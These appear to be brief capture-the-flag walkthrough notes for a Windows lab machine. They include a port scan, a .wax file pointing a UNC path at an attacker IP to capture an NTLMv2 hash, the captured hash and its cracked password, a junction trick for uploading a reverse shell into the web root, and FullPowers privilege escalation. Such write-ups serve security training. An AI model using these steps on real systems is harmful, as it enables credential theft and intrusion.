Scan : 

```sh
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 0bb3c0804088e1aeaa3b5ff4c223c00d (RSA)
|   256 e0803fddb1f8fc83f5ded5b32d5a4b39 (ECDSA)
|_  256 b532c07218100f245df8e1ce2a735c1f (ED25519)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-13T11:56:05+00:00
|_ssl-date: 2024-08-13T11:56:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2024-08-12T11:52:32
|_Not valid after:  2025-02-11T11:52:32
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
https://github.com/Greenwolf/ntlm_theft

- file.wax
```sh
file://\\10.8.3.12/steal/file
https://10.8.3.12/test
```

```sh
[SMB] NTLMv2-SSP Client   : 10.10.114.247
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:1122334455667788:8DF25B422AD85B0D448DB8B65EAE99B3:0101000000000000003F99758DEDDA014CA7DAE9C36B01A50000000002000800560033003900300001001E00570049004E002D0051005600590046004C0031004400310057004D00500004003400570049004E002D0051005600590046004C0031004400310057004D0050002E0056003300390030002E004C004F00430041004C000300140056003300390030002E004C004F00430041004C000500140056003300390030002E004C004F00430041004C0007000800003F99758DEDDA01060004000200000008003000300000000000000000000000003000002D3403DF02D837178C41B59BF2A1C77175AD08C49FAB9B24B67C94C4252485D50A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000

john --wordlist=/usr/share/wordlists/rockyou.txt  hash

enox: 1234virus@
```

User : VL{28ec1c0c64abcc790954f27429fbf5ff}

https://github.com/itm4n/FullPowers

- Create a jonction upload folder to website folder :
```sh
#We read the source code to dertermine where waht is the name of the upload folder.
mklink /J "C:\foldername" "C:\xampp\htdocs"
```
Then upload a reverse shell via the website 

- Enable privilege like impersonate : 
```sh
whoami --> NT AUTHORITY / LOCAL SERVICE
FullPower.exe # enableSeimpersonate
```

root VL{dc7871a771551174176b0cc7af8ad3bd}